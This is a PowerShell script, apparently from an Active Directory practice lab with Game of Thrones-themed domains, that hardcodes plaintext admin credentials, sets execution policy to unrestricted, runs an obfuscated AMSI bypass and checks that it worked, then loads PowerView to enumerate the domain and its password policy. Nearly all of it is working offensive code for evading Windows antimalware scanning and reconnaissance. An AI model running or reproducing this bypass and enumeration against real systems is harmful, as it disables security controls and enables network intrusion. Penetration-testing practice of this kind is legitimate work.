# Rename the PowerShell window to "PowerView"
$Host.UI.RawUI.WindowTitle = "PowerView"
whoami
# Define credentials
#$securePassword_regular = ConvertTo-SecureString "sexywolfy" -AsPlainText -Force
#$credential_regular = New-Object System.Management.Automation.PSCredential("NORTH\robb.stark", $securePassword_regular)

$securePassword_admin = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential_admin = New-Object System.Management.Automation.PSCredential("sevenkingdoms\robert.baratheon", $securePassword_admin)

# Set Execution Policy to Full Language Mode
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"

# AMSI Bypass
Write-Output "Attempting AMSI bypass..."
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

$output = try {
    amsiInitFailed
} catch {
    $_.Exception.Message
}

# Check the output for specific error messages
if ($output -match "is not recognized as the name of a cmdlet") {
    Write-Output "AMSI bypass successful: 'amsiInitFailed' is not recognized."
} elseif ($output -match "has been blocked by your antivirus software") {
    Write-Output "AMSI bypass failed: 'amsiInitFailed' command got blocked by antivirus."
    exit 1  # Exit with an error code to signal failure
} else {
    Write-Output "Unexpected output: $output"
    exit 1  # Exit with an error code for unexpected result
}

# Unblock and import PowerView module
Unblock-File ./PowerView/PowerView.ps1
Import-Module ./PowerView/PowerView.ps1 -Verbose

# Verify PowerView installation with Get-NetDomain
try {
    Write-Output "Verifying PowerView installation with Get-NetDomain..."
    Get-NetDomain -ErrorAction Stop
} catch {
    Write-Output "PowerView verification failed. Get-NetDomain could not be run: $_"
}

Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView"
try {
    (Get-DomainPolicy).Systemaccess
} catch {
    $_  # Output the error message directly
}


